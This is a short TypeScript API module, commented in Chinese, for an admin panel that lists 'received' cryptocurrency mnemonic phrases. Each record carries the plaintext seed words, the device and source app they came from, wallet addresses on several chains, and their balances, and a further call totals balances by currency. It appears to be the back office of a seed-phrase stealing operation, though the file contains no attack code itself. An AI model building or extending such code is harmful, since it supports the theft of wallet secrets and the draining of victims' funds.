import http from "@/api";

/**
 * @name 助记词管理模块
 */

// 助记词接口返回类型
export interface ReceiveWordsItem {
  id: number;
  device_id: number | null;
  device_number: string | null;
  app_name: string | null;
  app_package: string | null;
  words: string | null;
  wallet_address_btc: string | null;
  wallet_address_eth: string | null;
  wallet_address_bsc: string | null;
  wallet_address_tron: string | null;
  wallet_address_sol: string | null;
  wallet_address_ton: string | null;
  wallet_address_xrp: string | null;
  wallet_balance_btc: string | null;
  wallet_balance_eth: string | number | null;
  wallet_balance_bsc: string | number | null;
  wallet_balance_tron: string | number | null;
  wallet_balance_sol: string | null;
  wallet_balance_ton: string | null;
  wallet_balance_xrp: string | null;
  wallet_balance_eth_usdt: number | null;
  wallet_balance_bsc_usdt: number | null;
  wallet_balance_tron_usdt: number | null;
  created_at: string;
  updated_at: string;
}

// 助记词列表响应类型
export interface ReceiveWordsListResponse {
  total_num: number;
  list: ReceiveWordsItem[];
}

// 获取助记词列表
export const getReceiveWordsListApi = (params?: {
  page?: number;
  limit?: number;
  device_number?: string;
  app_name?: string;
  app_package?: string;
  device_id?: number;
}) => {
  return http.get<ReceiveWordsListResponse>(`/admin/receiveWords/list`, params, { loading: false });
};

// 获取指定助记词信息
export const getReceiveWordsInfoApi = (id: number) => {
  return http.get<ReceiveWordsItem>(`/admin/receiveWords/info`, { id }, { loading: false });
};

// 余额统计响应类型
export interface BalanceStatsResponse {
  [currencyType: string]: string; // 币种类型 -> 总余额（字符串格式）
}

// 获取余额统计
export const getBalanceStatsApi = () => {
  return http.get<BalanceStatsResponse>(`/admin/receiveWords/balanceStats`, {}, { loading: false });
};

